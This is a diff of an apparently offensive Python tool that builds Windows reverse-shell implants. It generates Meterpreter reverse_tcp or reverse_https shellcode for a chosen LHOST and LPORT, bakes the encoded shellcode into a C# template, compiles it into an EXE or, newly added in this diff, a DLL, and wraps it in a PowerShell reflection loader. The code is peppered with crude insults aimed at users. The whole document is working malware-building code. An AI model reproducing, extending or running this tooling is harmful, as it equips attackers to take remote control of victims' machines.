@@ -30,19 +30,32 @@ def banner():
 banner()
 LHOST = input(f"{orange}{bold}LHOST:{white} ")
 LPORT = input(f"{orange}{bold}LPORT:{white} ")
-PAYLOAD = input(f"{orange}{bold}PAYLOAD TYPE({green}{bold}tcp{orange}/{green}{bold}https{orange}):{white} ")
+PAYLOAD = input(f"{orange}{bold}PAYLOAD PROTO({green}{bold}tcp{orange}/{green}{bold}https{orange}):{white} ")
+PAYLOAD_TYPE = input(f"{orange}{bold}PAYLOAD TYPE({green}{bold}exe[{red}Default{green}]{orange}/{green}{bold}dll{orange}):{white} ")
 msfvenom = "windows/x64/meterpreter/reverse_"
 
+# Checking the availability of the output directory and if not available then give birth to it
 if not os.path.isdir("output"):
 	print_info(f"First Time use detected, Generating required Directories...")
 	subprocess.run(["mkdir","output"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 
+# Checking if some one is a**hole enough to enter a payload other than tcp or https, and if they do slap them
 if PAYLOAD.lower() not in ["tcp","https"]:
-	print_error(f"{PAYLOAD} is an invalid payload type {red}{bold}dipshit{end}. Either use {bold}{green}https{end} or {bold}{green}tcp{end}")
+	print_error(f"{PAYLOAD} is an invalid payload {red}{bold}dipshit{end}. Either use {bold}{green}https{end} or {bold}{green}tcp{end}")
 	exit()
+
+# Empty payload_type means exe
+if PAYLOAD_TYPE.lower() == "":
+	PAYLOAD_TYPE = "exe"
+
+if PAYLOAD_TYPE.lower() not in ["exe","dll"]:
+	print_error(f"{PAYLOAD_TYPE} is an invalid payload type {red}{bold}dipshit{end}. Either use {bold}{green}exe{end} or {bold}{green}dll{end}")
+	exit()
+
 
 # If someone decides to enter the payload in capitals, or maybe when I type and my capslock is on accidentally
 PAYLOAD = PAYLOAD.lower()
+PAYLOAD_TYPE = PAYLOAD_TYPE.lower()
 
 print_info(f"Using LHOST as {orange}{bold}{LHOST}{end}, LPORT as {bold}{orange}{LPORT}{end} and PAYLOAD as {bold}{orange}{msfvenom}{PAYLOAD}")
 
@@ -86,47 +99,68 @@ print_info(f"Deleting the msf_shellcode.hex file as no one wants it anymore")
 
 # Assembling a c# sln project with encoded shellcode in the output directory
 print_info(f"Baking the fresh Shellcode into a C# project for compiling")
-csharp_proj_name = f"{LHOST}_{LPORT}_{PAYLOAD}"
+csharp_proj_name = f"{LHOST}_{LPORT}_{PAYLOAD}_{PAYLOAD_TYPE}"
 
 if os.path.isdir(f"output/{csharp_proj_name}"):
 	print_info("Existing generated shellcode found, Overwriting it :P")
 	subprocess.run(["rm","-rf",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 
 subprocess.run(["mkdir","-p",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-subprocess.run(["cp","-r","templates/rev_exe",f"output/{csharp_proj_name}/csharp"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 
-with open(f"output/{csharp_proj_name}/csharp/Program.cs","r") as csharp_template_code:
+# Checking if the user is wanting a dll or a exe
+if PAYLOAD_TYPE == "exe":
+	subprocess.run(["cp","-r","templates/rev_exe",f"output/{csharp_proj_name}/csharp"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+if PAYLOAD_TYPE == "dll":
+	subprocess.run(["cp","-r","templates/rev_dll",f"output/{csharp_proj_name}/csharp"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+
+with open(f"output/{csharp_proj_name}/csharp/black_order.cs","r") as csharp_template_code:
 	template_code = csharp_template_code.readlines()
 
+# Injecting our shellcode in the C# template
 template_code.insert(30,final_shellcode)
 
-with open(f"output/{csharp_proj_name}/csharp/Program.cs","w") as final_csharp_code:
+with open(f"output/{csharp_proj_name}/csharp/black_order.cs","w") as final_csharp_code:
 	template_code = "".join(template_code)
 	final_csharp_code.write(template_code)
 print_success(f"Your C# shellcode runner is baked successfully, and it smells nice !!!")
 
-# Checking the availability of mono-mcs and Powershell on Linux
+# Checking the availability of mono-mcs
 try:
 	mcs_availability = subprocess.run(["mcs","--version"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT).returncode
 except FileNotFoundError:
 	mcs_availability = 1
+# Checking the availability of Powershell on Linux
 try:
 	pwsh_availability = subprocess.run(["pwsh","--version"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT).returncode
 except FileNotFoundError:
 	pwsh_availability = 1
 
+# This block is executed when mono-mcs is found so we try to compile the damn payload
 if mcs_availability == 0:
 	print_success("C# Compiler found, Time for some frosting on the cake ^_^")
 	# Starting the compilation of the payload using mono-mcs
-	subprocess.run(["mcs",f"-out:output/{csharp_proj_name}/rev.exe",f"output/{csharp_proj_name}/csharp/Program.cs"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
-	print_success(f"Your cake has been frosted successfully and named output/{csharp_proj_name}/rev.exe")
+
+	# Compiling the source into an Windows executable
+	if PAYLOAD_TYPE == "exe":
+		subprocess.run(["mcs",f"-out:output/{csharp_proj_name}/rev.exe",f"output/{csharp_proj_name}/csharp/black_order.cs"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+	
+	# Compiling the source into a Windows Library
+	if PAYLOAD_TYPE == "dll":
+		subprocess.run(["mcs","-target:library",f"-out:output/{csharp_proj_name}/rev.dll",f"output/{csharp_proj_name}/csharp/black_order.cs"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+	print_success(f"Your cake has been frosted successfully and named output/{csharp_proj_name}/rev.{PAYLOAD_TYPE}")
+
+# No mono-mcs compiler found go and compiler found so go f*** yourself
 else:
 	print_error(f"Err!!! Could not compile the C# payload, possibly mcs is missing :(")
+
+# Generating reflection file using the exe or dll 
 if pwsh_availability == 0 and mcs_availability == 0:
 	print_success("Powershell Found, Let's Box up your frosted cake...")
-	subprocess.run(["pwsh","reflection_pwsh_gen.ps1","-File",f"output/{csharp_proj_name}/rev.exe"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
+	subprocess.run(["pwsh","reflection_pwsh_gen.ps1","-File",f"output/{csharp_proj_name}/rev.{PAYLOAD_TYPE}"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 	subprocess.run(["mv","rev.ps1",f"output/{csharp_proj_name}/"], stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
 	print_success(f"Boxed it up and named output/{csharp_proj_name}/rev.ps1")
+
+# Nothing available on your system maybe your are that child who is even hated by their own mother :P
 elif pwsh_availability == 0 and mcs_availability != 0:
 	print_error("Reflection cannot be generated if the code is not yet compiled !!!")
 	print_info("Please compile the code into an executable and then, attempt to generate an reflection with the ps1 script :)")
